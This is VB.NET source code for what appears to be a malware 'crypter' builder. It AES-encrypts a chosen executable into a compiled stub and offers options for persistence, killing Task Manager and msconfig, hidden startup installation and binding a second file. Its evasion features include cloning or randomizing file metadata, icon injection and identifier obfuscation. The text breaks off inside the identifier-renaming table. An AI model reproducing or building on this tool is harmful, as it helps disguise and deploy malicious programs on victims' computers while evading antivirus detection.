Imports System.Text
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security

Public Class Form1

    Dim FileByte() As Byte
    Private Sub SelectFileButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SelectFileButton.Click
        Dim o As New OpenFileDialog
        o.Filter = "Portable Executable |*.exe"
        If o.ShowDialog = vbOK Then
            FilePathTextBox.Text = o.FileName
            FileByte = IO.File.ReadAllBytes(o.FileName)
            ' If isDotNet(FileByte) = True Then
            'grpInject.Enabled = False
            ' chkRoot.Checked = False
            'End If
            ' Else
            'Exit Sub
        End If
    End Sub

    Dim Extension As String
    Private Sub SelectBindFileButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SelectBindFileButton.Click
        Dim o As New OpenFileDialog
        o.Filter = "Any File |*.*"
        If o.ShowDialog = vbOK Then
            BindPathTextBox.Text = o.FileName
            Extension = IO.Path.GetExtension(o.FileName)
        Else
            Exit Sub
        End If
    End Sub

    Private Sub BindToggle_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BindToggle.CheckedChanged
        BindPathTextBox.Enabled = BindToggle.Checked
        SelectBindFileButton.Enabled = BindToggle.Checked
        BindCheckBox.Enabled = BindToggle.Checked

        If BindToggle.Checked = False Then
            BindCheckBox.Checked = False
            BindPathTextBox.Text = ""
        End If
    End Sub

    Private Sub ProcessOptionsToggle_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessOptionsToggle.CheckedChanged
        PersistenceCheckBox.Enabled = ProcessOptionsToggle.Checked
        TaskkillCheckBox.Enabled = ProcessOptionsToggle.Checked
        StartupCheckBox.Enabled = ProcessOptionsToggle.Checked
        If ProcessOptionsToggle.Checked = False Then
            StartupFirstRadioButton.Enabled = False
            StartupCombobox.Enabled = False
            StartupTextBox.Enabled = False
            StartupHideParentFolderCheckBox.Enabled = False
            StartupHideEXEFileCheckBox.Enabled = False
            TaskkillTextBox.Enabled = False

            PersistenceCheckBox.Checked = False
            TaskkillCheckBox.Checked = False
            StartupCheckBox.Checked = False
            StartupHideEXEFileCheckBox.Checked = False
            StartupHideParentFolderCheckBox.Checked = False

            TaskkillTextBox.Text = "taskmgr.exe; msconfig.exe;"
            StartupTextBox.Text = "\ParentFolderName\Filename.exe"
        End If
    End Sub

    Private Sub TaskkillCheckBox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TaskkillCheckBox.CheckedChanged
        TaskkillTextBox.Enabled = TaskkillCheckBox.Checked
    End Sub

    Private Sub StartupCheckBox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartupCheckBox.CheckedChanged
        StartupFirstRadioButton.Enabled = StartupCheckBox.Checked
        StartupCombobox.Enabled = StartupCheckBox.Checked
        StartupTextBox.Enabled = StartupCheckBox.Checked
        StartupHideEXEFileCheckBox.Enabled = StartupCheckBox.Checked
        StartupHideParentFolderCheckBox.Enabled = StartupCheckBox.Checked

        If StartupCheckBox.Checked = False Then
            StartupHideEXEFileCheckBox.Checked = False
            StartupHideParentFolderCheckBox.Checked = False
        End If
    End Sub

    Private Sub AISEToggle_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AISEToggle.CheckedChanged
        AISEAssemblyCheckBox.Enabled = AISEToggle.Checked
        AISEIconCheckBox.Enabled = AISEToggle.Checked

        If AISEToggle.Checked = False Then
            AISEAssemblyCheckBox.Checked = False
            AISEAssembly1TextBox.Enabled = False
            AISEAssembly2TextBox.Enabled = False
            AISEAssembly3TextBox.Enabled = False
            AISEAssembly4TextBox.Enabled = False
            AISEAssembly5TextBox.Enabled = False
            AISEAssembly6TextBox.Enabled = False
            AISEAssembly1Numeric.Enabled = False
            AISEAssembly2Numeric.Enabled = False
            AISEAssembly3Numeric.Enabled = False
            AISEAssembly4Numeric.Enabled = False
            AISEAssemblyEngRadioButton.Enabled = False
            AISEAssemblyMixRadioButton.Enabled = False
            AISERandomizeAssemblyButton.Enabled = False
            AISECloneAssemblyButton.Enabled = False

            AISEIconCheckBox.Checked = False
            AISEIconPathTextBox.Enabled = False
            AISEIconPictureBox.Enabled = False
            AISEIconButton.Enabled = False


            AISEAssembly1TextBox.Text = ""
            AISEAssembly2TextBox.Text = ""
            AISEAssembly3TextBox.Text = ""
            AISEAssembly4TextBox.Text = ""
            AISEAssembly5TextBox.Text = ""
            AISEAssembly6TextBox.Text = ""
            AISEAssembly1Numeric.Text = "1"
            AISEAssembly2Numeric.Text = "0"
            AISEAssembly3Numeric.Text = "0"
            AISEAssembly4Numeric.Text = "0"

            AISEIconPathTextBox.Text = ""
        End If
    End Sub

    Private Sub AISEAssemblyCheckBox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AISEAssemblyCheckBox.CheckedChanged
        AISEAssembly1TextBox.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly2TextBox.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly3TextBox.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly4TextBox.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly5TextBox.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly6TextBox.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly1Numeric.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly2Numeric.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly3Numeric.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssembly4Numeric.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssemblyEngRadioButton.Enabled = AISEAssemblyCheckBox.Checked
        AISEAssemblyMixRadioButton.Enabled = AISEAssemblyCheckBox.Checked
        AISERandomizeAssemblyButton.Enabled = AISEAssemblyCheckBox.Checked
        AISECloneAssemblyButton.Enabled = AISEAssemblyCheckBox.Checked
    End Sub

    Private Sub AISEIconCheckBox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AISEIconCheckBox.CheckedChanged
        AISEIconPathTextBox.Enabled = AISEIconCheckBox.Checked
        AISEIconPictureBox.Enabled = AISEIconCheckBox.Checked
        AISEIconButton.Enabled = AISEIconCheckBox.Checked
    End Sub



    Private Sub AISEIconButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AISEIconButton.Click
        Dim o As New OpenFileDialog
        o.Filter = "Icon File |*.ico"
        If o.ShowDialog = vbOK Then
            AISEIconPathTextBox.Text = o.FileName
            AISEIconPictureBox.ImageLocation = o.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub AISECloneAssemblyButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AISECloneAssemblyButton.Click
        Dim o As New OpenFileDialog
        o.Filter = "Any File |*.*"
        If o.ShowDialog = vbOK Then
            ReadAssembly(o.FileName)
            AISEAssembly1TextBox.Text = FileTitle
            AISEAssembly2TextBox.Text = FileDescription
            AISEAssembly3TextBox.Text = FileCompany
            AISEAssembly4TextBox.Text = Fileproduct
            AISEAssembly5TextBox.Text = Filecopyright
            AISEAssembly6TextBox.Text = FileCompany
            AISEAssembly1Numeric.Text = Fileversion1
            AISEAssembly2Numeric.Text = Fileversion2
            AISEAssembly3Numeric.Text = Fileversion3
            AISEAssembly4Numeric.Text = Fileversion4
        Else
            Exit Sub
        End If
    End Sub

    Dim FileTitle As String
    Dim FileDescription As String
    Dim FileCompany As String
    Dim Fileproduct As String
    Dim Filecopyright As String
    Dim Filetrademark As String
    Dim Fileversion1 As Integer
    Dim Fileversion2 As Integer
    Dim Fileversion3 As Integer
    Dim Fileversion4 As Integer
    Sub ReadAssembly(ByVal Filepath As String)
        Dim f As FileVersionInfo = FileVersionInfo.GetVersionInfo(Filepath)
        FileTitle = f.InternalName
        FileDescription = f.FileDescription
        FileCompany = f.CompanyName
        Fileproduct = f.ProductName
        Filecopyright = f.LegalCopyright
        Filetrademark = f.LegalTrademarks
        Dim version As String()
        If f.FileVersion.Contains(",") Then
            version = f.FileVersion.Split(","c)
        Else
            version = f.FileVersion.Split("."c)
        End If
        Try
            Fileversion1 = version(0)
            Fileversion2 = version(1)
            Fileversion3 = version(2)
            Fileversion4 = version(3)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AISERandomizeAssemblyButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AISERandomizeAssemblyButton.Click
        AISEAssembly1TextBox.Text = random25()
        AISEAssembly2TextBox.Text = random25()
        AISEAssembly3TextBox.Text = random25()
        AISEAssembly4TextBox.Text = random25()
        AISEAssembly5TextBox.Text = random25()
        AISEAssembly6TextBox.Text = random25()

        AISEAssembly1Numeric.Text = CInt(Int((999 * Rnd()) + 0))
        AISEAssembly2Numeric.Text = CInt(Int((999 * Rnd()) + 0))
        AISEAssembly3Numeric.Text = CInt(Int((999 * Rnd()) + 0))
        AISEAssembly4Numeric.Text = CInt(Int((999 * Rnd()) + 0))
    End Sub

    Dim r As New Random
    Function random25() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim mix As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String
        If AISEAssemblyEngRadioButton.Checked Then
            s = eng
        ElseIf AISEAssemblyMixRadioButton.Checked Then
            s = mix
        End If
        Dim sb As New StringBuilder
        For i As Integer = 1 To 30
            Dim idx As Integer = r.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function


    Private Sub GenerateEncryptionKeyButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GenerateEncryptionKeyButton.Click
        CryptEncryptionKey.Text = enckey()
    End Sub

    Private Sub CryptButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CryptButton.Click
        If FilePathTextBox.Text = "" Then
            MsgBox("Error! No .EXE File Is Selected.")
            Exit Sub
        End If

        'Retrieve stub from memory
        Dim Src As String = My.Resources.stub

        'REPLACE PERSISTENCE OPTIONS ON STUB
        If PersistenceCheckBox.Checked = True Then
            Src = Replace(Src, "'%Persist%", Nothing)
        Else
            Src = Replace(Src, "'%PersistNOT%", Nothing)
        End If

        If (TaskkillCheckBox.Checked = True) And Not (TaskkillTextBox.Text = "") Then
            'REPLACE TASKKILL OPTIONS ON STUB
            Src = Replace(Src, "%TASKLIST%", TaskkillTextBox.Text)
            Src = Replace(Src, "'%Taskkill%", Nothing)
        End If

        If StartupCheckBox.Checked = True Then
            If StartupCombobox.Text = "" Then
                MsgBox("Error! No Special Startup Folder Is Selected.")
                Exit Sub
            Else
                'REPLACE STARTUPSPECIALPATH ON STUB
            End If
            If StartupTextBox.Text = "" Then
                MsgBox("Error! No Startup File Path Is Selected.")
                Exit Sub
            Else
                'REPLACE STARTUPFILEPATH ON STUB
                Src = Replace(Src, "'%StartupEnabled%", Nothing)
                Src = Replace(Src, "%StartupSpecialFolder%", StartupCombobox.Text)
                Src = Replace(Src, "%StartupPath%", StartupTextBox.Text)
            End If
            If StartupFirstRadioButton.Checked = True Then
                Src = Replace(Src, "%StartupMethod%", "1")
                Src = Replace(Src, "%APPNAME%", FileTitle)
            End If
            If StartupHideEXEFileCheckBox.Checked = True Then
                Src = Replace(Src, "'%StartupHideEXEFile%", Nothing)
            End If
            If StartupHideParentFolderCheckBox.Checked = True Then
                Src = Replace(Src, "'%StartupHideParentFolder%", Nothing)
            End If
        End If

        'ASSEMBLY OPTIONS
        If AISEAssemblyCheckBox.Checked = True Then
            Src = Replace(Src, "%Title%", FileTitle)
            Src = Replace(Src, "%Description%", FileDescription)
            Src = Replace(Src, "%Company%", FileCompany)
            Src = Replace(Src, "%Product%", Fileproduct)
            Src = Replace(Src, "%Copyright%", Filecopyright)
            Src = Replace(Src, "%Trademark%", Filetrademark)
            Src = Replace(Src, "%n1%", Fileversion1)
            Src = Replace(Src, "%n2%", Fileversion2)
            Src = Replace(Src, "%n3%", Fileversion3)
            Src = Replace(Src, "%n4%", Fileversion4)
            Src = Replace(Src, "'%ASSEMBLY%", Nothing)
        End If


        'Get Save Path for the final file
        Dim SavePath As String
        SaveFileDialog1.Filter = "EXE Files (*.exe*)|*.exe"
        If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            SavePath = SaveFileDialog1.FileName
        Else
            Exit Sub
        End If

        'Obscure the values and funtion names in the stub
        Src = nchange.namechange(Src)

        'Read EXE File
        Dim input As New FileStream(FilePathTextBox.Text, FileMode.Open, FileAccess.Read)
        Dim reader As New BinaryReader(input)
        Dim bytes() As Byte
        bytes = reader.ReadBytes(CInt(input.Length))

        'Convert EXE File's Bytes to Hex
        Dim hex As String = BytesToString(bytes)

        'Encryption Key
        If CryptEncryptionKey.Text = "" Then
            CryptEncryptionKey.Text = enckey()
        End If

        'AES Encrypt hex exe file
        Dim exefilestringenc = AES_Encrypt(hex, CryptEncryptionKey.Text)

        'Put encryption key in stub for later decryption when deployed
        Src = Replace(Src, "%EncryptionKey%", CryptEncryptionKey.Text)

        'Resources for stub
        Dim RESA As String = Application.StartupPath & "\Z.resources"
        Using A As New Resources.ResourceWriter(RESA)
            A.AddResource("FirstResource", exefilestringenc)

            'BIND
            If BindToggle.Checked = True Then
                A.AddResource("SecondResource", Encoding.Default.GetString(IO.File.ReadAllBytes(BindPathTextBox.Text)))
                Src = Src.Replace("%Extension%", Extension)
                Src = Src.Replace("'BINDER", Nothing)
                If BindCheckBox.Checked = True Then
                    Src = Src.Replace("%OnceCheck%", "True")
                Else
                    Src = Src.Replace("%OnceCheck%", "False")
                End If
            End If

            A.Generate()
        End Using

        'Compile Code
        Compile(Src, SavePath, "Class1")
        My.Computer.FileSystem.DeleteFile(RESA)
        CryptLogTextBox.Text = Src

        If (AISEIconCheckBox.Checked = True) And Not (AISEIconPathTextBox.Text = "") Then
            IconInjector.InjectIcon(SavePath, AISEIconPathTextBox.Text)
        End If


        MsgBox("빌드 성공!")

        'CryptLogTextBox.Text =
        '    ".EXE File Path:   " & FilePathTextBox.Text & Environment.NewLine & Environment.NewLine &
        '    "Bind Toggle Checked:   " & ToString(BindToggle.Checked) & Environment.NewLine &
        '    "Bind File Path:   " & BindPathTextBox.Text & Environment.NewLine &
        '    "Bind File RunOnce:   " & ToString(BindCheckBox.Checked) & Environment.NewLine & Environment.NewLine &
        '    "Process Options Toggle Enabled:   " & ToString(ProcessOptionsToggle.Checked) & Environment.NewLine &
        '    "Persistence:   " & ToString(PersistenceCheckBox.Checked) & Environment.NewLine &
        '    "Taskkill:   " & ToString(TaskkillCheckBox.Checked) & Environment.NewLine &
        '    "TaskKillList:   " & TaskkillTextBox.Text & Environment.NewLine &
        '    "StartupMethod:   " & StartupMethod & Environment.NewLine &
        '    "StartupSpecialFolder:   " & StartupSpecialFolder & Environment.NewLine &
        '    "StartupPath:   " & StartupPath & Environment.NewLine &
        '    "StartupHideParentFolder:   " & StartupHideParentFolder & Environment.NewLine &
        '    "StartupHideEXEFile:   " & StartupHideEXEFile & Environment.NewLine & Environment.NewLine &
        '    "AISEToggleEnabled:   " & AISEToggleEnabled & Environment.NewLine &
        '    "FileTitle:   " & FileTitle & Environment.NewLine &
        '    "FileDescription:   " & FileDescription & Environment.NewLine &
        '    "FileCompany:   " & FileCompany & Environment.NewLine &
        '    "FileProduct:   " & Fileproduct & Environment.NewLine &
        '    "FileCopyright:   " & Filecopyright & Environment.NewLine &
        '    "FileTrademark:   " & Filetrademark & Environment.NewLine &
        '    "FileVersion1:   " & Fileversion1 & Environment.NewLine &
        '    "FileVersion2:   " & Fileversion2 & Environment.NewLine &
        '    "FileVersion3:   " & Fileversion3 & Environment.NewLine &
        '    "FileVersion4:   " & Fileversion4 & Environment.NewLine &
        '    "IconPath:   " & IconPath & Environment.NewLine &
        '    "SizePumpTarget:   " & SizePumpTarget & Environment.NewLine &
        '    "SizePumpType:   " & SizePumpType & Environment.NewLine &
        '    "SpoofExtension:   " & SpoofExtension & Environment.NewLine &
        '    "SpoofExtensionText:   " & SpoofExtensionText & Environment.NewLine & Environment.NewLine &
        '    "MessageBoxToggleEnabled:   " & MessageBoxToggleEnabled & Environment.NewLine &
        '    "MessageBoxTitle:   " & MessageBoxTitle & Environment.NewLine &
        '    "MessageBoxMessage:   " & MessageBoxMessage & Environment.NewLine &
        '    "MessageBoxDisplayOnce:   " & MessageBoxDisplayOnce & Environment.NewLine & Environment.NewLine &
        '    "EncryptionKey:   " & EncryptionKey & Environment.NewLine
    End Sub

#Region "Stub Compiling"
    'Stub Compiling
    Public Sub Compile(ByVal Source As String, ByVal Out As String, ByVal ClassName As String, Optional ByVal Icon As String = "")
        Dim ProviderOptions As New Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")
        Dim CP As New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim P As New CodeDom.Compiler.CompilerParameters
        Dim s As New StringBuilder()
        s.Append(" /target:winexe")
        s.Append(" /platform:x86")
        s.Append(" /optimize+")
        P.GenerateExecutable = True
        P.OutputAssembly = Out
        If Icon = "" Then
        Else
            s.Append(" /win32icon:""" & Icon & """")
        End If
        P.EmbeddedResources.Add(Application.StartupPath & "\Z.resources")
        P.CompilerOptions += s.ToString()
        P.IncludeDebugInformation = False
        P.ReferencedAssemblies.Add("System.Dll")
        P.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Dim Results1 = CP.CompileAssemblyFromSource(P, Source)
        For Each uii As CodeDom.Compiler.CompilerError In Results1.Errors
            MessageBox.Show(uii.ToString)
        Next
    End Sub
#End Region

    'Functions
#Region "Encryption Key Generator Function for AES Encryption"
    'Random Encryption Key Generation For AES Encryption
    Private Function enckey()
        Dim Letters As New List(Of Integer)
        'add ASCII codes for numbers
        For i As Integer = 48 To 57
            Letters.Add(i)
        Next
        'lowercase letters
        For i As Integer = 97 To 122
            Letters.Add(i)
        Next
        'uppercase letters
        For i As Integer = 65 To 90
            Letters.Add(i)
        Next
        'select 8 random integers from number of items in Letters
        'then convert those random integers to characters and
        'add each to a string and display in Textbox
        Dim Rnd As New Random
        Dim SB As New System.Text.StringBuilder
        Dim Temp As Integer
        For count As Integer = 1 To 50
            Temp = Rnd.Next(0, Letters.Count)
            SB.Append(Chr(Letters(Temp)))
        Next
        Return SB.ToString
    End Function
#End Region

#Region "Byte-to-HEX function"
    'bytes2hex
    Private Function BytesToString(ByVal Input As Byte()) As String
        Dim Result As New System.Text.StringBuilder(Input.Length * 2)
        Dim Part As String
        For Each b As Byte In Input
            Part = Conversion.Hex(b)
            If Part.Length = 1 Then Part = "0" & Part
            Result.Append(Part)
        Next
        Return Result.ToString()
    End Function
#End Region

#Region "AES Encryption Function"
    'aes encryption
    Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function
#End Region

End Class

#Region "Icon Injector"
Public Class IconInjector

    <SuppressUnmanagedCodeSecurity()>
    Private Class NativeMethods
        <DllImport("kernel32")>
        Public Shared Function BeginUpdateResource(
            ByVal fileName As String,
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32")>
        Public Shared Function UpdateResource(
            ByVal hUpdate As IntPtr,
            ByVal type As IntPtr,
            ByVal name As IntPtr,
            ByVal language As Short,
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)>
            ByVal data() As Byte,
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("kernel32")>
        Public Shared Function EndUpdateResource(
            ByVal hUpdate As IntPtr,
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class

    ' The first structure in an ICO file lets us know how many images are in the file.
    <StructLayout(LayoutKind.Sequential)>
    Private Structure ICONDIR
        Public Reserved As UShort  ' Reserved, must be 0
        Public Type As UShort      ' Resource type, 1 for icons.
        Public Count As UShort     ' How many images.
        ' The native structure has an array of ICONDIRENTRYs as a final field.
    End Structure

    ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
    ' starts in the file. The other fields give the information required to turn that image data into a valid
    ' bitmap.
    <StructLayout(LayoutKind.Sequential)>
    Private Structure ICONDIRENTRY
        Public Width As Byte            ' Width, in pixels, of the image
        Public Height As Byte           ' Height, in pixels, of the image
        Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
        Public Reserved As Byte         ' Reserved ( must be 0)
        Public Planes As UShort         ' Color Planes
        Public BitCount As UShort       ' Bits per pixel
        Public BytesInRes As Integer   ' Length in bytes of the pixel data
        Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
    End Structure

    ' Each image is stored in the file as an ICONIMAGE structure:
    'typdef struct
    '{
    '   BITMAPINFOHEADER   icHeader;      // DIB header
    '   RGBQUAD         icColors[1];   // Color table
    '   BYTE            icXOR[1];      // DIB bits for XOR mask
    '   BYTE            icAND[1];      // DIB bits for AND mask
    '} ICONIMAGE, *LPICONIMAGE;


    <StructLayout(LayoutKind.Sequential)>
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure

    ' The icon in an exe/dll file is stored in a very similar structure:
    <StructLayout(LayoutKind.Sequential, Pack:=2)>
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = IconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub

    Private Class IconFile

        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte

        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property

        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
            End Get
        End Property

        Private Sub New()
        End Sub

        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            ' Read all the bytes from the file.
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            ' First struct is an ICONDIR
            ' Pin the bytes from the file in memory so that we can read them.
            ' If we didn't pin them then they could move around (e.g. when the
            ' garbage collector compacts the heap)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            ' Read the ICONDIR
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
            Dim offset = Marshal.SizeOf(instance.iconDir)
            ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i = 0 To instance.iconDir.Count - 1
                ' Grab the structure.
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                ' Grab the associated pixel data.
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function

        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            ' This will store the memory version of the icon.
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function

    End Class

End Class
#End Region

#Region "Rename Function for Stub Variables and Function Names"
Public Class nchange

    Shared length As Integer = Form1.ObscurationNumeric.Text
    Public Shared Function namechange(ByVal input As String) As String

        Dim term(88) As String
        term(0) = "222001"
        term(1) = "222002"
        term(2) = "222003"
        term(3) = "222004"
        term(4) = "222005"
        term(5) = "222006"
        term(6) = "222007"
        term(7) = "222008"
        term(8) = "222009"
        term(9) = "222010"
        term(10) = "222011"
        term(11) = "222012"
        term(12) = "222013"
        term(13) = "222014"
        term(14) = "222015"
        term(15) = "222016"
        term(16) = "222017"
        term(17) = "222018"
        term(18) = "222019"
        term(19) = "222020"
        term(20) = "222021"
        term(21) = "222022"
        term(22) = "222023"
        term(23) = "222024"
        term(24) = "222025"
        term(25) = "222026"
        term(26) = "222027"
        term(27) = "222028"
        term(28) = "222029"
        term(29) = "222030"
        term(30) = "222031"
        term(31) = "222032"
        term(32) = "222033"
        term(33) = "222034"
        term(34) = "222035"
        term(35) = "222036"
        term(36) = "222037"
        term(37) = "222038"
        term(38) = "222039"
        term(39) = "222040"
        term(40) = "222041"
        term(41) = "222042"
        term(42) = "222043"
        term(43) = "222044"
        term(44) = "222045"
        term(45) = "222046"
        term(46) = "222047"
        term(47) = "222048"
        term(48) = "222049"
        term(49) = "222050"
        term(50) = "222051"
        term(51) = "222052"
        term(52) = "222053"
        term(53) = "222054"
        term(54) = "222055"
        term(55) = "222056"
        term(56) = "222057"
        term(57) = "222058"
        term(58) = "222059"
        term(59) = "222060"
        term(60) = "222061"
        term(61) = "222062"
        term(62) = "222063"
        term(63) = "222064"
        term(64) = "222065"
        term(65) = "222066"
        term(66) = "222067"
        term(67) = "222068"
        term(68) = "222069"
        term(69) = "222070"
        term(70) = "222071"
        term(71) = "222072"
        term(72) = "222073"
        term(73) = "222074"
        term(74) = "222075"
        term(75) = "222076"
        term(76) = "222077"
        term(77) = "222078"
        term(78) = "222079"
        term(79) = "222080"
